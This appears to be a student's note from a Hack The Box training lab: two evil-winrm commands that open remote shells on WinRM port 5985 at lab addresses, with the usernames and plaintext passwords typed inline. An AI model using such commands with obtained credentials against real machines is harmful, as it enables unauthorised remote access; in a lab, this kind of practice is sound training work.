Port 5985

evil-winrm -i 10.129.136.91 -u administrator -p badminton

evil-winrm -i 10.129.159.3 -u netadm -p “HTB_@cademy_stdnt!”